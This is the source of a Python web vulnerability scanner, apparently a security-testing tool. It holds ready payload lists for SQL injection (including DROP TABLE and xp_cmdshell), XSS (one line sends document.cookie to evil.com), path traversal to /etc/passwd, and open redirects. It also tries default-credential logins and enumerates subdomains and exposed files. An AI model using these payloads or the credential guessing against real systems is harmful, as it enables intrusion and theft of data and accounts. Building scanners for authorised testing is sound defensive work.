#!/usr/bin/env python3
"""
+==========================================================+
|         ADVANCED WEB VULNERABILITY SCANNER v2.0          |
|              by [Your Name] | Security Research          |
+==========================================================+

Usage:
    python scanner.py -u https://example.com
    python scanner.py -u https://example.com --full-scan
    python scanner.py -u https://example.com --report html
    python scanner.py -u https://example.com --crawl --threads 5
"""

import argparse
import sys
import io

# Fix Windows terminal Unicode
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
import time
import json
import re
import os
import random
import urllib.parse
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except Exception:
        pass
except ImportError:
    print("[!] Missing: pip install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing: pip install beautifulsoup4")
    sys.exit(1)

# --- ANSI Colors -----------------------------------------
class C:
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    BLUE   = '\033[94m'
    CYAN   = '\033[96m'
    WHITE  = '\033[97m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'
    BG_RED = '\033[41m'

# --- PAYLOADS ---------------------------------------------
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "' OR 'x'='x",
    "'; DROP TABLE users;--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    '"><script>alert(document.cookie)</script>',
    "'-alert(1)-'",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<%2Fscript><script>alert('XSS')<%2Fscript>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>fetch('https://evil.com?c='+document.cookie)</script>",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "../../windows/win.ini",
    "../../boot.ini",
    "../../../../windows/system32/drivers/etc/hosts",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2F..",
    "///evil.com",
    "\\\\evil.com",
    "https://evil.com?",
    "//evil.com#",
]

SENSITIVE_FILES = [
    "/.git/HEAD",
    "/.git/config",
    "/.env",
    "/.env.backup",
    "/config.php",
    "/wp-config.php",
    "/admin/",
    "/administrator/",
    "/phpmyadmin/",
    "/robots.txt",
    "/sitemap.xml",
    "/.htaccess",
    "/backup.zip",
    "/backup.sql",
    "/db.sql",
    "/database.sql",
    "/debug.log",
    "/error.log",
    "/access.log",
    "/server-status",
    "/server-info",
    "/.DS_Store",
    "/Thumbs.db",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/web.config",
    "/package.json",
    "/composer.json",
]

SQLI_ERROR_PATTERNS = [
    r"mysql_fetch_array",
    r"mysql_num_rows",
    r"ORA-\d{5}",
    r"Microsoft OLE DB Provider",
    r"ODBC SQL Server Driver",
    r"SQLite3::query",
    r"pg_query\(\)",
    r"supplied argument is not a valid MySQL",
    r"You have an error in your SQL syntax",
    r"Warning: mysql_",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"Syntax error or access violation",
    r"Division by zero",
    r"SQLSTATE",
    r"mysqli_fetch_array",
    r"DB2 SQL error",
]


# --- WAF SIGNATURES --------------------------------------
WAF_SIGNATURES = {
    'Cloudflare':   ['cloudflare', '__cfduid', 'cf-ray', 'cf-cache-status'],
    'AWS WAF':      ['x-amzn-requestid', 'x-amz-cf-id', 'awselb'],
    'Akamai':       ['akamai', 'ak_bmsc', 'x-check-cacheable'],
    'ModSecurity':  ['mod_security', 'modsecurity', 'NOYB'],
    'Sucuri':       ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
    'Incapsula':    ['incap_ses', 'visid_incap', 'incapsula'],
    'F5 BIG-IP':    ['bigipserver', 'f5', 'ts01', 'tspd_'],
    'Barracuda':    ['barra_counter_session', 'barracuda'],
    'Imperva':      ['x-iinfo', 'x-cdn=imperva'],
    'Wordfence':    ['wordfence'],
}

# --- SUBDOMAINS TO CHECK ----------------------------------
COMMON_SUBDOMAINS = [
    'admin', 'api', 'dev', 'staging', 'test', 'beta',
    'mail', 'webmail', 'ftp', 'cpanel', 'portal',
    'dashboard', 'app', 'mobile', 'cdn', 'static',
    'blog', 'shop', 'store', 'old', 'new', 'demo',
    'vpn', 'remote', 'git', 'gitlab', 'jenkins',
    'jira', 'confluence', 'docs', 'wiki', 'internal',
]

# --- BLIND SQLI PAYLOADS ---------------------------------
BLIND_SQLI_PAYLOADS = [
    ("' AND SLEEP(4)--",          4),
    ("1; WAITFOR DELAY '0:0:3'--", 3),
    ("' OR SLEEP(3)--",           3),
    ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 3),
    ("1 AND SLEEP(3)",            3),
    ("' AND 1=SLEEP(3)--",        3),
]

# --- SCANNER CLASS ----------------------------------------
class VulnScanner:
    def __init__(self, target, threads=3, timeout=10, verbose=False, crawl=False,
                 socket_callback=None, finding_callback=None, ssrf_guard=None):
        self.target            = target.rstrip('/')
        self.threads           = threads
        self.timeout           = timeout
        self.verbose           = verbose
        self.crawl             = crawl
        self.socket_callback   = socket_callback   # For web UI live output
        self.finding_callback  = finding_callback  # For web UI live findings
        self.ssrf_guard        = ssrf_guard        # callable(url) -> bool, see security.py
        self.session     = requests.Session()
        from requests.adapters import HTTPAdapter
        _adapter = HTTPAdapter(max_retries=2)
        self.session.mount('http://', _adapter)
        self.session.mount('https://', _adapter)
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })
        self.findings    = []
        self.crawled     = set()
        self.forms_found = []
        self.start_time  = None
        self.domain      = urlparse(target).netloc
        self.waf_detected = False

    def log(self, level, msg):
        icons = {'INFO': f'{C.CYAN}[*]{C.RESET}', 'VULN': f'{C.RED}[VULN]{C.RESET}',
                 'WARN': f'{C.YELLOW}[!]{C.RESET}', 'OK': f'{C.GREEN}[+]{C.RESET}',
                 'SKIP': f'{C.DIM}[-]{C.RESET}'}
        ts = datetime.now().strftime('%H:%M:%S')
        # Print to terminal
        try:
            print(f"{C.DIM}{ts}{C.RESET} {icons.get(level,'[?]')} {msg}")
        except Exception:
            pass
        # Emit to web socket if running as web app
        if self.socket_callback:
            clean_msg = msg
            for attr in ['RED','GREEN','YELLOW','BLUE','CYAN','WHITE','BOLD','DIM','RESET','BG_RED']:
                clean_msg = clean_msg.replace(getattr(C, attr, ''), '')
            self.socket_callback(level, clean_msg)

    def add_finding(self, vuln_type, url, severity, details, evidence=""):
        # Deduplicate - same vuln type on same URL only report once
        for existing in self.findings:
            if existing['type'] == vuln_type and existing['url'] == url:
                return
        finding = {
            'type': vuln_type,
            'url': url,
            'severity': severity,
            'details': details,
            'evidence': evidence,
            'timestamp': datetime.now().isoformat()
        }
        self.findings.append(finding)
        sev_color = {
            'CRITICAL': f'{C.BG_RED}{C.WHITE}',
            'HIGH': C.RED,
            'MEDIUM': C.YELLOW,
            'LOW': C.CYAN,
            'INFO': C.BLUE
        }.get(severity, C.WHITE)
        self.log('VULN', f"{sev_color}[{severity}]{C.RESET} {vuln_type} -> {C.BOLD}{url}{C.RESET}")
        try:
            if details:
                print(f"          {C.DIM}> {details}{C.RESET}")
        except Exception:
            pass
        # Send to web UI in real-time
        if self.finding_callback:
            self.finding_callback(finding)

    def get(self, url, params=None, **kwargs):
        # Redirects are followed manually (one hop at a time) so each hop can be
        # re-validated against the SSRF allow-list in security.py. A malicious or
        # compromised target could otherwise redirect the scanner to an internal
        # address (e.g. the cloud metadata service) and have requests follow it
        # automatically.
        allow_redirects = kwargs.pop('allow_redirects', True)
        for attempt in range(2):
            try:
                r = self.session.get(url, params=params,
                                     timeout=self.timeout + attempt * 5,
                                     verify=False, allow_redirects=False, **kwargs)
                hops = 0
                while allow_redirects and r.is_redirect and hops < 5:
                    location = r.headers.get('Location')
                    if not location:
                        break
                    next_url = urljoin(r.url, location)
                    if self.ssrf_guard and not self.ssrf_guard(next_url):
                        self.log('WARN', f'Blocked redirect to disallowed target: {next_url}')
                        break
                    r = self.session.get(next_url, timeout=self.timeout, verify=False,
                                         allow_redirects=False)
                    hops += 1
                return r
            except Exception:
                time.sleep(0.3)
        return None

    def post(self, url, data=None, **kwargs):
        try:
            r = self.session.post(url, data=data, timeout=self.timeout, verify=False, **kwargs)
            return r
        except Exception:
            return None

    # -- CRAWL ---------------------------------------------
    def crawl_site(self, url, depth=2):
        if depth == 0 or url in self.crawled:
            return
        parsed = urlparse(url)
        if parsed.netloc != self.domain:
            return
        self.crawled.add(url)
        self.log('INFO', f'Crawling: {url}')
        r = self.get(url)
        if not r:
            self.log('WARN', f'No response: {url}')
            return
        try:
            soup = BeautifulSoup(r.text, 'html.parser')
        except Exception:
            return
        # Extract forms - deduplicate by action URL
        for form in soup.find_all('form'):
            form_data = self._parse_form(form, url)
            if form_data:
                # Skip if we already have a form with same action
                already_have = any(
                    f['action'] == form_data['action'] and f['method'] == form_data['method']
                    for f in self.forms_found
                )
                if not already_have:
                    self.forms_found.append(form_data)
        # Extract links - keep query params for injection testing
        for tag in soup.find_all(['a', 'link'], href=True):
            href = tag['href']
            if href.startswith(('mailto:', 'javascript:', '#', 'tel:')):
                continue
            full_no_params = urljoin(url, href).split('#')[0].split('?')[0]
            full_with_params = urljoin(url, href).split('#')[0]
            for link in set([full_no_params, full_with_params]):
                if link not in self.crawled and urlparse(link).netloc == self.domain:
                    self.crawl_site(link, depth - 1)

    def _parse_form(self, form, page_url):
        action  = form.get('action', '')
        method  = form.get('method', 'get').lower()
        action_url = urljoin(page_url, action) if action else page_url
        inputs  = []
        for inp in form.find_all(['input', 'textarea', 'select']):
            name  = inp.get('name', '')
            itype = inp.get('type', 'text')
            value = inp.get('value', 'test')
            if name and itype not in ['submit', 'button', 'image', 'reset']:
                inputs.append({'name': name, 'type': itype, 'value': value})
        if inputs:
            return {'action': action_url, 'method': method, 'inputs': inputs, 'page': page_url}
        return None

    # -- HEADERS CHECK --------------------------------------
    def check_security_headers(self):
        self.log('INFO', 'Checking security headers...')
        r = self.get(self.target)
        if not r:
            r = self.get(self.target.replace('https://', 'http://'))
        if not r:
            self.log('WARN', 'Cannot reach target for header check')
            return
        headers = r.headers

        checks = [
            ('Strict-Transport-Security', 'HSTS not set', 'MEDIUM'),
            ('X-Frame-Options', 'Clickjacking protection missing', 'MEDIUM'),
            ('X-Content-Type-Options', 'MIME sniffing not prevented', 'LOW'),
            ('Content-Security-Policy', 'CSP header missing', 'MEDIUM'),
            ('X-XSS-Protection', 'XSS Protection header missing', 'LOW'),
            ('Referrer-Policy', 'Referrer-Policy not set', 'LOW'),
            ('Permissions-Policy', 'Permissions-Policy not set', 'INFO'),
        ]

        for header, msg, severity in checks:
            if header not in headers:
                self.add_finding('Missing Security Header', self.target, severity,
                                 f'{msg}: {header}')
            else:
                if self.verbose:
                    self.log('OK', f'Header present: {header}')

        # Check for info-leaking headers
        for header in ['Server', 'X-Powered-By', 'X-AspNet-Version']:
            if header in headers:
                self.add_finding('Information Disclosure', self.target, 'LOW',
                                 f'{header}: {headers[header]}')

    # -- COOKIE CHECKS -------------------------------------
    def check_cookies(self):
        self.log('INFO', 'Analyzing cookies...')
        r = self.get(self.target)
        if not r:
            r = self.get(self.target.replace('https://', 'http://'))
        if not r:
            self.log('WARN', 'Cannot reach target for cookie check')
            return
        for cookie in r.cookies:
            issues = []
            if not cookie.secure:
                issues.append('Secure flag missing')
            if not cookie.has_nonstandard_attr('HttpOnly'):
                issues.append('HttpOnly flag missing')
            if not cookie.has_nonstandard_attr('SameSite'):
                issues.append('SameSite flag missing')
            if issues:
                self.add_finding('Insecure Cookie', self.target, 'MEDIUM',
                                 f"Cookie '{cookie.name}': {', '.join(issues)}")

    # -- SQL INJECTION --------------------------------------
    def check_sqli_url(self, url):
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = urllib.parse.parse_qs(parsed.query)
        for param, values in params.items():
            for payload in SQLI_PAYLOADS[:8]:  # test first 8 for speed
                test_params = dict(params)
                test_params[param] = payload
                test_url = parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True)).geturl()
                r = self.get(test_url)
                if r:
                    for pattern in SQLI_ERROR_PATTERNS:
                        if re.search(pattern, r.text, re.IGNORECASE):
                            self.add_finding('SQL Injection', test_url, 'CRITICAL',
                                             f"Parameter: {param} | Pattern: {pattern}",
                                             f"Payload: {payload}")
                            return
                time.sleep(0.1)

    def check_sqli_form(self, form):
        data = {}
        for inp in form['inputs']:
            data[inp['name']] = inp['value']

        for payload in SQLI_PAYLOADS[:8]:
            for field in data.keys():
                test_data = dict(data)
                test_data[field] = payload
                if form['method'] == 'post':
                    r = self.post(form['action'], data=test_data)
                else:
                    r = self.get(form['action'], params=test_data)
                if r:
                    for pattern in SQLI_ERROR_PATTERNS:
                        if re.search(pattern, r.text, re.IGNORECASE):
                            self.add_finding('SQL Injection (Form)', form['action'], 'CRITICAL',
                                             f"Field: {field} | Pattern: {pattern}",
                                             f"Payload: {payload}")
                            return

    # -- XSS -----------------------------------------------
    def check_xss_url(self, url):
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = urllib.parse.parse_qs(parsed.query)
        for param, values in params.items():
            for payload in XSS_PAYLOADS[:6]:
                test_params = dict(params)
                test_params[param] = payload
                test_url = parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True)).geturl()
                r = self.get(test_url)
                if r and payload in r.text:
                    self.add_finding('Reflected XSS', test_url, 'HIGH',
                                     f"Parameter: {param} | Payload reflected in response",
                                     f"Payload: {payload}")
                    return

    def check_xss_form(self, form):
        data = {}
        for inp in form['inputs']:
            data[inp['name']] = inp['value']

        for payload in XSS_PAYLOADS[:6]:
            for field in data.keys():
                test_data = dict(data)
                test_data[field] = payload
                if form['method'] == 'post':
                    r = self.post(form['action'], data=test_data)
                else:
                    r = self.get(form['action'], params=test_data)
                if r and payload in r.text:
                    self.add_finding('Reflected XSS (Form)', form['action'], 'HIGH',
                                     f"Field: {field} | Payload reflected",
                                     f"Payload: {payload}")
                    return

    # -- SENSITIVE FILES ------------------------------------
    def check_sensitive_files(self):
        self.log('INFO', f'Checking {len(SENSITIVE_FILES)} sensitive paths...')
        def check_file(path):
            url = self.target + path
            r = self.get(url)
            if r and r.status_code == 200 and len(r.text) > 10:
                severity = 'CRITICAL' if path in ['/.env', '/.git/HEAD', '/wp-config.php'] else 'HIGH'
                self.add_finding('Sensitive File Exposed', url, severity,
                                 f"HTTP {r.status_code} | Size: {len(r.text)} bytes | Path: {path}")

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            ex.map(check_file, SENSITIVE_FILES)

    # -- BROKEN AUTH ----------------------------------------
    def check_broken_auth(self):
        self.log('INFO', 'Testing broken authentication...')
        login_paths = ['/login', '/admin/login', '/wp-login.php', '/signin', '/auth/login',
                       '/user/login', '/account/login', '/panel', '/dashboard']
        default_creds = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('root', 'root'), ('admin', 'admin123'), ('test', 'test'),
            ('user', 'user'), ('admin', ''), ('administrator', 'administrator'),
        ]

        for path in login_paths:
            url = self.target + path
            r = self.get(url)
            if not r or r.status_code not in [200, 301, 302]:
                continue
            self.log('INFO', f'Login page found: {url}')
            soup = BeautifulSoup(r.text, 'html.parser')
            form = soup.find('form')
            if not form:
                continue
            user_field = None
            pass_field = None
            for inp in form.find_all('input'):
                iname = inp.get('name', '').lower()
                itype = inp.get('type', '').lower()
                if itype == 'password':
                    pass_field = inp.get('name')
                elif any(k in iname for k in ['user', 'email', 'login', 'uname']):
                    user_field = inp.get('name')
            if not (user_field and pass_field):
                continue
            action = urljoin(url, form.get('action', url))
            baseline_len = len(r.text)
            for user, pw in default_creds[:5]:
                data = {user_field: user, pass_field: pw}
                resp = self.post(action, data=data)
                if resp:
                    if resp.url != url and 'login' not in resp.url.lower():
                        self.add_finding('Default Credentials', url, 'CRITICAL',
                                         f"Login succeeded with {user}:{pw}")
                        return
                    if abs(len(resp.text) - baseline_len) > 200:
                        self.add_finding('Possible Default Credentials', url, 'HIGH',
                                         f"Response changed with {user}:{pw} - manual verify needed")

    # -- CSRF ----------------------------------------------
    def check_csrf(self):
        self.log('INFO', 'Checking CSRF protections on forms...')
        for form in self.forms_found:
            has_csrf = any(
                any(k in inp['name'].lower() for k in ['csrf', 'token', '_token', 'nonce'])
                for inp in form['inputs']
            )
            if not has_csrf and form['method'] == 'post':
                self.add_finding('Missing CSRF Token', form['action'], 'MEDIUM',
                                 f"POST form on {form['page']} has no CSRF protection")

    # -- OPEN REDIRECT -------------------------------------
    def check_open_redirect(self, url):
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = urllib.parse.parse_qs(parsed.query)
        redirect_params = ['redirect', 'url', 'next', 'goto', 'return', 'returnurl',
                           'redirect_uri', 'destination', 'redir', 'target']
        for param in params:
            if param.lower() in redirect_params:
                for payload in OPEN_REDIRECT_PAYLOADS[:3]:
                    test_params = dict(params)
                    test_params[param] = payload
                    test_url = parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True)).geturl()
                    r = self.get(test_url, allow_redirects=False)
                    if r and r.status_code in [301, 302]:
                        loc = r.headers.get('Location', '')
                        if 'evil.com' in loc:
                            self.add_finding('Open Redirect', test_url, 'MEDIUM',
                                             f"Redirects to: {loc}", f"Payload: {payload}")
                            return

    # -- LFI CHECK -----------------------------------------
    def check_lfi(self, url):
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = urllib.parse.parse_qs(parsed.query)
        lfi_params = ['file', 'page', 'include', 'path', 'doc', 'template', 'view', 'load']
        for param in params:
            if param.lower() in lfi_params:
                for payload in LFI_PAYLOADS[:5]:
                    test_params = dict(params)
                    test_params[param] = payload
                    test_url = parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True)).geturl()
                    r = self.get(test_url)
                    if r and ('root:x:' in r.text or '[extensions]' in r.text):
                        self.add_finding('Local File Inclusion (LFI)', test_url, 'CRITICAL',
                                         f"Parameter: {param} | File contents leaked",
                                         f"Payload: {payload}")
                        return


    # -- WAF DETECTION -------------------------------------
    def check_waf(self):
        self.log('INFO', 'Detecting WAF / firewall...')
        r = self.get(self.target)
        if not r:
            return
        headers_str = ' '.join(
            f"{k.lower()}:{v.lower()}" for k, v in r.headers.items()
        )
        cookies_str = ' '.join(
            c.name.lower() for c in r.cookies
        )
        combined = headers_str + ' ' + cookies_str

        # Also try a known-bad payload to trigger WAF block page
        probe_url = self.target + "/?waf_test=<script>alert(1)</script>"
        r2 = self.get(probe_url)
        block_text = r2.text.lower() if r2 else ''

        detected = []
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in combined or sig.lower() in block_text:
                    detected.append(waf_name)
                    break

        if detected:
            waf_list = ', '.join(set(detected))
            self.add_finding(
                'WAF Detected', self.target, 'INFO',
                f'Web Application Firewall detected: {waf_list}',
                'Some payloads may be blocked - results may be incomplete'
            )
            self.log('WARN', f'WAF detected: {waf_list} - payloads may be blocked!')
            self.waf_detected = True
        else:
            self.log('OK', 'No WAF detected - injection tests will be more effective')
            self.waf_detected = False

    # -- SUBDOMAIN ENUMERATION -----------------------------
    def check_subdomains(self):
        self.log('INFO', f'Enumerating {len(COMMON_SUBDOMAINS)} subdomains...')
        domain = self.domain
        # Remove www. prefix
        if domain.startswith('www.'):
            domain = domain[4:]

        found = []

        def check_sub(sub):
            url = f"http://{sub}.{domain}"
            r = self.get(url)
            if r and r.status_code in [200, 301, 302, 403]:
                sev = 'HIGH' if sub in ['admin','dev','staging','test','jenkins','git','gitlab'] else 'MEDIUM'
                self.add_finding(
                    'Subdomain Found', url, sev,
                    f'Subdomain {sub}.{domain} is accessible (HTTP {r.status_code})',
                    f'May expose internal/development environment'
                )
                found.append(sub)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            ex.map(check_sub, COMMON_SUBDOMAINS)

        if found:
            self.log('OK', f'Found {len(found)} subdomains: {", ".join(found)}')
        else:
            self.log('INFO', 'No exposed subdomains found')

    # -- BLIND SQLI (TIME-BASED) ---------------------------
    def check_blind_sqli_url(self, url):
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = urllib.parse.parse_qs(parsed.query)
        for param in params:
            for payload, sleep_time in BLIND_SQLI_PAYLOADS[:4]:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)).geturl()
                t_start = time.time()
                r = self.get(test_url)
                elapsed = time.time() - t_start
                # If response took >= sleep_time - 0.5s, likely vulnerable
                if r and elapsed >= (sleep_time - 0.5):
                    self.add_finding(
                        'Blind SQL Injection (Time-based)', test_url, 'CRITICAL',
                        f'Parameter: {param} | Response delayed {elapsed:.1f}s (expected {sleep_time}s)',
                        f'Payload: {payload}'
                    )
                    return

    def check_blind_sqli_form(self, form):
        # Skip login/auth forms - password fields not SQLi targets + wastes time
        auth_actions = ['login', 'signin', 'auth', 'dologin', 'authenticate']
        if any(a in form['action'].lower() for a in auth_actions):
            return
        base = {inp['name']: inp['value'] for inp in form['inputs']}
        # Only test non-password fields
        testable = {k: v for k, v in base.items()
                    if not any(p in k.lower() for p in ['pass', 'pwd', 'password', 'secret'])}
        if not testable:
            return
        for payload, sleep_time in BLIND_SQLI_PAYLOADS[:3]:
            for field in testable:
                test = dict(base)
                test[field] = payload
                t_start = time.time()
                r = (self.post(form['action'], data=test)
                     if form['method'] == 'post'
                     else self.get(form['action'], params=test))
                elapsed = time.time() - t_start
                if r and elapsed >= (sleep_time - 0.5):
                    self.add_finding(
                        'Blind SQL Injection (Time-based)', form['action'], 'CRITICAL',
                        f'Field: {field} | Response delayed {elapsed:.1f}s',
                        f'Payload: {payload}'
                    )
                    return

    # -- HTTPS CHECK ---------------------------------------
    def check_https(self):
        if self.target.startswith('http://'):
            self.add_finding('No HTTPS', self.target, 'HIGH',
                             'Site does not use HTTPS - data transmitted in plaintext')
        else:
            # Check HTTP redirect
            http_url = 'http://' + self.target.split('://', 1)[1]
            r = self.get(http_url, allow_redirects=False)
            if r and r.status_code not in [301, 302]:
                self.add_finding('HTTP Not Redirected to HTTPS', http_url, 'MEDIUM',
                                 'HTTP requests are not redirected to HTTPS')

    # -- MAIN SCAN -----------------------------------------
    def run(self, full_scan=False):
        self.start_time = time.time()
        if not self.socket_callback:
            banner()
        print(f"\n{C.BOLD}{C.CYAN}  Target  : {C.WHITE}{self.target}{C.RESET}")
        print(f"{C.BOLD}{C.CYAN}  Mode    : {C.WHITE}{'Full Scan' if full_scan else 'Standard'}{C.RESET}")
        print(f"{C.BOLD}{C.CYAN}  Threads : {C.WHITE}{self.threads}{C.RESET}")
        print(f"{C.BOLD}{C.CYAN}  Started : {C.WHITE}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}\n")
        print(f"  ----------------------------------------------------\n")

        # Phase 1 - Crawl
        if self.crawl or full_scan:
            self.log('INFO', f'{C.BOLD}Phase 1: Crawling site (deep)...{C.RESET}')
            self.crawl_site(self.target, depth=3)
        else:
            self.log('INFO', f'{C.BOLD}Phase 1: Crawling homepage...{C.RESET}')
            self.crawl_site(self.target, depth=2)
        self.log('OK', f'Crawled {len(self.crawled)} pages | Found {len(self.forms_found)} forms')

        print()

        # Phase 2 - Static Checks
        self.log('INFO', f'{C.BOLD}Phase 2: Static analysis...{C.RESET}')
        self.check_https()
        self.check_waf()
        self.check_security_headers()
        self.check_cookies()
        self.check_sensitive_files()
        self.check_subdomains()
        print()

        # Phase 3 - Auth & Logic
        self.log('INFO', f'{C.BOLD}Phase 3: Authentication checks...{C.RESET}')
        self.check_broken_auth()
        self.check_csrf()
        print()

        # Phase 4 - Injection Tests
        urls_with_params = [u for u in self.crawled if '?' in u]
        self.log('INFO', f'{C.BOLD}Phase 4: Injection testing...{C.RESET}')
        self.log('INFO', f'URLs with params: {len(urls_with_params)} | Forms: {len(self.forms_found)}')

        if not urls_with_params and not self.forms_found:
            self.log('WARN', 'No injectable params or forms found')

        # Deduplicate URLs - test each unique base path only once
        seen_paths = set()
        for url in list(self.crawled):
            base_path = urlparse(url).path
            if base_path in seen_paths:
                continue
            seen_paths.add(base_path)
            self.check_sqli_url(url)
            self.check_xss_url(url)
            self.check_lfi(url)
            self.check_open_redirect(url)

        # Forms already deduplicated during crawl
        for form in self.forms_found:
            self.log('INFO', f'Injecting into form: {form["action"]} ({len(form["inputs"])} fields)')
            self.check_sqli_form(form)
            self.check_xss_form(form)
        print()

        # Summary
        elapsed = time.time() - self.start_time
        self._print_summary(elapsed)
        return self.findings

    def _print_summary(self, elapsed):
        sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for f in self.findings:
            sev_count[f['severity']] = sev_count.get(f['severity'], 0) + 1

        print(f"\n  ----------------------------------------------------")
        print(f"\n{C.BOLD}  >> SCAN COMPLETE - {elapsed:.1f}s | {len(self.crawled)} pages | {len(self.findings)} findings{C.RESET}\n")
        print(f"  {C.BG_RED}{C.WHITE} CRITICAL {C.RESET} {sev_count['CRITICAL']}    "
              f"{C.RED}HIGH {C.RESET} {sev_count['HIGH']}    "
              f"{C.YELLOW}MEDIUM {C.RESET} {sev_count['MEDIUM']}    "
              f"{C.CYAN}LOW {C.RESET} {sev_count['LOW']}    "
              f"{C.BLUE}INFO {C.RESET} {sev_count['INFO']}\n")


# --- REPORT GENERATORS ------------------------------------
def generate_json_report(findings, target, output_dir='reports'):
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fname = f"{output_dir}/scan_{ts}.json"
    data = {
        'target': target,
        'scan_time': datetime.now().isoformat(),
        'total_findings': len(findings),
        'findings': findings
    }
    with open(fname, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    return fname


def generate_html_report(findings, target, output_dir='reports'):
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fname = f"{output_dir}/scan_{ts}.html"

    sev_colors = {'CRITICAL': '#ff2d55', 'HIGH': '#ff6b35', 'MEDIUM': '#ffc200', 'LOW': '#00c8ff', 'INFO': '#8b92a5'}
    sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
    for f in findings:
        sev_count[f['severity']] = sev_count.get(f['severity'], 0) + 1

    rows = ""
    for i, f in enumerate(findings, 1):
        color = sev_colors.get(f['severity'], '#8b92a5')
        rows += f"""
        <tr>
            <td>{i}</td>
            <td><span class="badge" style="background:{color}">{f['severity']}</span></td>
            <td><strong>{f['type']}</strong></td>
            <td class="url">{f['url']}</td>
            <td>{f['details']}</td>
            <td class="evidence">{f.get('evidence','')}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vulnerability Scan Report - {target}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Rajdhani:wght@400;600;700&display=swap');
  :root {{--bg:#0a0d14;--surface:#111621;--border:#1d2535;--accent:#00f5d4;--red:#ff2d55;--yellow:#ffc200;--text:#c9d1e0;}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;min-height:100vh}}
  .scan-header{{background:linear-gradient(135deg,#0a0d14 0%,#111f35 100%);border-bottom:1px solid var(--border);padding:40px 60px;position:relative;overflow:hidden}}
  .scan-header::before{{content:'';position:absolute;top:-50%;left:-10%;width:600px;height:600px;background:radial-gradient(circle,rgba(0,245,212,.06),transparent 70%);}}
  .logo{{font-family:'JetBrains Mono',monospace;color:var(--accent);font-size:13px;letter-spacing:2px;margin-bottom:16px}}
  h1{{font-size:36px;font-weight:700;color:#fff;letter-spacing:1px}}
  .meta{{color:#8b92a5;margin-top:8px;font-size:15px}}
  .meta span{{color:var(--accent)}}
  .stats{{display:flex;gap:20px;margin-top:30px;flex-wrap:wrap}}
  .stat-card{{background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:8px;padding:16px 24px;min-width:120px}}
  .stat-num{{font-size:32px;font-weight:700;font-family:'JetBrains Mono',monospace}}
